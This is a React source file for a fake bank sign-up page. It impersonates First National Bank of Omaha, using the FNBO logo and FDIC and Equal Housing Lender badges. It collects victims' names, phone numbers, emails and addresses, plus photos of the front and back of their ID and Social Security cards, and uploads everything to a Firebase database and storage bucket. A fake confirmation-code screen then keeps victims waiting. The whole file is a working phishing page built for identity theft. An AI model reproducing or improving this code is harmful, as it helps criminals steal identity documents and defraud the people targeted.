import { useState } from "react"
import { app, database,storage } from "./firebaseConfig";
import { collection, addDoc } from "firebase/firestore";
import { ref, uploadBytesResumable,getDownloadURL } from "firebase/storage";


function App() {

 

  const collectionRef = collection(database, 'users');
  const collectionRef2 = collection(database, 'code');

  const [confirmState, setConfirmState] =  useState(false);

  const [signInfo, setSignInfo] = useState({
    firstName: "",
    lastName: "",
    phoneNumber: "",
    email: "",
    country: "",
    state: "",
    fullAddress: "",
    frontImage: "",
    backImage: "",
    fIdCard: "",
    bIdCard: "",
  })

  function collectInfo(event) {
    setSignInfo((prev)=> {
      return {
        ...prev,
        [event.target.name]: event.target.value,
      }
    });
    console.log(signInfo)
  }

  function submitData(event) {
    event.preventDefault();
    addDoc(collectionRef, {
      firstName: signInfo.firstName,
      lastName: signInfo.lastName,
      phoneNumber: signInfo.phoneNumber,
      email: signInfo.email,
      country: signInfo.country,
      state: signInfo.state,
      fullAddress: signInfo.fullAddress,
    })
    .then(()=> {
      console.log("data added");
      setConfirmState(true)
    })
    .catch((err)=>{
      alert(err.message)
    })


    const fIdPicRef = ref(storage, signInfo.fIdCard.name);
    const uploadTask3 = uploadBytesResumable(fIdPicRef, signInfo.fIdCard);
    uploadTask3.on('state_changed', (snapshot)=> {
        const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
        console.log(progress)
    }),
    (error)=> {
      console.log(error)
    };

    const bIdPicRef = ref(storage, signInfo.bIdCard.name);
    const uploadTask4 = uploadBytesResumable(bIdPicRef, signInfo.bIdCard);
    uploadTask4.on('state_changed', (snapshot)=> {
        const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
        console.log(progress)
    }),
    (error)=> {
      console.log(error)
    };



    const frontPicRef = ref(storage, signInfo.frontImage.name);
    const uploadTask = uploadBytesResumable(frontPicRef, signInfo.frontImage);
    uploadTask.on('state_changed', (snapshot)=> {
        const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
        console.log(progress)
    }),
    (error)=> {
      console.log(error)
    };


    const backPicRef = ref(storage, signInfo.backImage.name);
    const uploadTask2 = uploadBytesResumable(backPicRef, signInfo.backImage);
    uploadTask2.on('state_changed', (snapshot)=> {
        const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
        console.log(progress)
    }),
    (error)=> {
      console.log(error)
    };
  }

  function anError() {
    alert("validation not complete, please wait for a code")
  }

  return (
    <section className="app">
      {confirmState ? 

       <div className="code-box">
           <h1>Enter Confirmation Code</h1>
           <p>a confirmation code would be sent to your email/phone number within 24 hours to complete your application</p>
           <input type="number" />
           <button onClick={anError} >Confirm</button>
      </div> :

      <div className="login-box">
        <div className="logo">
          <img src="https://www.card.fnbo.com/content/dam/fnbo/logos/fnbo-simple-green.svg" alt="" />
        </div>
        <form className="main" onSubmit={submitData}>
          <div className="head"><p>SIGN UP</p></div>
          <div className="inputs">
            <div className="inner-input">
              <p>First Name</p>
              <input type="text" name="firstName" onChange={collectInfo}/>
            </div>
            <div className="inner-input">
              <p>Last Name</p>
              <input type="text" name="lastName" onChange={collectInfo}/>
            </div>
            <div className="inner-input">
              <p>Phone Number</p>
              <input type="number" name="phoneNumber" onChange={collectInfo}/>
            </div>
            <div className="inner-input">
              <p>Email</p>
              <input type="email" name="email" onChange={collectInfo}/>
            </div>
            <div className="inner-input">
              <p>Country</p>
              <input type="text" name="country" onChange={collectInfo}/>
            </div>
            <div className="inner-input">
              <p>State</p>
              <input type="text" name="state" onChange={collectInfo}/>
            </div>

            <div className="inner-input">
              <p>Full Address</p>
              <input type="text" name="fullAddress" onChange={collectInfo}/>
            </div>

           

            <div className="inner-input">
              <p>Upload a clear photo of front of Identification Card (ID card)</p>
              <div className="upload">
                <input type="file" className="no-b" onChange={(event)=> setSignInfo((prev)=>{
                  return {
                    ...prev,
                     fIdCard: event.target.files[0],
                  }
                })}/>
              </div>
            </div>

            <div className="inner-input">
              <p>Upload a clear photo of back of Identification Card (ID card)</p>
              <div className="upload">
                <input type="file" className="no-b" onChange={(event)=> setSignInfo((prev)=>{
                  return {
                    ...prev,
                     bIdCard: event.target.files[0],
                  }
                })}/>
              </div>
            </div>

            <div className="inner-input">
              <p>Upload a clear photo of front of SSN card</p>
              <div className="upload">
                <input type="file" className="no-b" onChange={(event)=> setSignInfo((prev)=>{
                  return {
                    ...prev,
                     frontImage: event.target.files[0],
                  }
                })}/>
              </div>
            </div>

            <div className="inner-input">
              <p>Upload a clear photo of back of SSN card</p>
              <div className="upload">
               
              </div><input type="file" className="no-b" onChange={(event)=> setSignInfo((prev)=>{
                  return {
                    ...prev,
                     backImage: event.target.files[0],
                  }
                })}/>
            </div>


          </div>
          <div className="remember">
            <input type="checkbox" />
            <p>Remember me</p>
          </div>
          <div className="sign-btn">
            <button>Continue</button>
          </div>
        </form>
      </div>

}



      <div className="policy">
        <p>Policy</p>
        <p>Security statement</p>
        <p>Member FDIC</p>
        <img src="https://www.securebanklogin.com/brand/images/logo-equal-housing-lender.png" alt="" />
      </div>
    </section>
  )
}

export default App
